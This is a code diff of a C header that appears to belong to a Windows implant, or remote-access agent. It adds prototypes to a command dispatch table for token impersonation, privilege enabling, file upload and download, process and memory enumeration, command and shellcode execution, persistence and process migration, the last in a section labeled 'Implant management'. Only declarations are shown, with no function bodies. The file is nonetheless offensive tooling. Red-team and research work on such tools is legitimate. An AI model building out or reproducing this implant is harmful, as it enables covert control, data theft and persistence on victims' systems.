@@ -1,12 +1,27 @@
 #pragma once
+
+/*
+ * command.h - Command dispatch table and handler prototypes.
+ *
+ * This header intentionally does NOT include exports.h.  The dependency runs
+ * the other way: exports.h includes command.h so that callers of the exported
+ * API also get the command table types.  Including exports.h here would create
+ * a circular dependency that causes #pragma once to fire mid-processing and
+ * silently drop declarations.
+ */
+
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+
 #include <Windows.h>
 
 #include "debug.h"
 #include "error.h"
 #include "generated_commands.h"
+#include "process.h"
 #include "security.h"
 #include "system.h"
-#include "exports.h"
 
 typedef DWORD (*CommandFunction)(
 	DWORD dataLen,
@@ -23,94 +38,71 @@ typedef struct _COMMAND_MAP
 
 extern CONST COMMAND_MAP G_CommandTable[];
 
-/**
- * @brief Returns a summary of the current process token.
- *
- * The current implementation returns a TOKEN_SUMMARY payload containing the
- * user name, user SID, elevation state, and whether the current thread is
- * impersonating.
- *
- * @param dataLen The command argument length in bytes. Unused by this handler.
- * @param data The command argument buffer. Unused by this handler.
- * @param responseData Receives an optional heap-allocated response buffer.
- * @param responseLen Receives the response buffer length in bytes.
- *
- * @return A numeric error or success code.
- */
-DWORD CmdInspectToken(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-);
+/* ------------------------------------------------------------------
+ * Existing token / system commands
+ * ------------------------------------------------------------------ */
 
-/**
- * @brief Attempts to impersonate the token of a target process.
- *
- * This command reports a numeric success or failure code and the
- * user name of the owner of the impersonated token.
- *
- * @param dataLen The command argument length in bytes.
- * @param data The command argument buffer containing the target PID.
- * @param responseData Receives an optional heap-allocated response buffer.
- * @param responseLen Receives the response buffer length in bytes.
- *
- * @return A numeric error or success code.
- */
-DWORD CmdImpersonateToken(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-);
+DWORD CmdInspectToken(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdImpersonateToken(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdEnablePrivilege(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdDisablePrivilege(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdHostname(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdWhoami(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
 
-/**
- * @brief Attempts to enable a named privilege on the current process token.
- *
- * The request payload is expected to contain a UTF-8 privilege name string.
- * This command reports a numeric success or failure code and whether the
- * privilege was previously enabled.
- *
- * @param dataLen The command argument length in bytes.
- * @param data The command argument buffer containing the privilege name.
- * @param responseData Receives an optional heap-allocated response buffer.
- * @param responseLen Receives the response buffer length in bytes.
- *
- * @return A numeric error or success code.
- */
-DWORD CmdEnablePrivilege(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-);
+/* ------------------------------------------------------------------
+ * Filesystem
+ * ------------------------------------------------------------------ */
 
-/**
-* @brief 
-*/
-DWORD CmdDisablePrivilege(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-);
+DWORD CmdLs(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdCat(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdMkdir(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdRm(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdUpload(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdDownload(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
 
-/**
-* @brief 
-*/
-DWORD CmdHostname(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-);
+/* ------------------------------------------------------------------
+ * System enumeration
+ * ------------------------------------------------------------------ */
 
-DWORD CmdWhoami(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-);
+DWORD CmdPs(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdGetpid(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+
+/* ------------------------------------------------------------------
+ * Execution
+ * ------------------------------------------------------------------ */
+
+DWORD CmdExec(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdShellcodeexec(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+
+/* ------------------------------------------------------------------
+ * Memory / object inspection
+ * ------------------------------------------------------------------ */
+
+DWORD CmdMemread(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdModulelist(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdHandlelist(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+
+/* ------------------------------------------------------------------
+ * Environment
+ * ------------------------------------------------------------------ */
+
+DWORD CmdEnv(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdGetenv(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdSetenv(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+
+/* ------------------------------------------------------------------
+ * Implant management
+ * ------------------------------------------------------------------ */
+
+DWORD CmdSleep(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdKill(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdPersist(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdUnpersist(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+DWORD CmdMigrate(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
+
+/* ------------------------------------------------------------------
+ * Dispatch
+ * ------------------------------------------------------------------ */
 
 DWORD ExecuteCommandById(
 	DWORD cmdId,
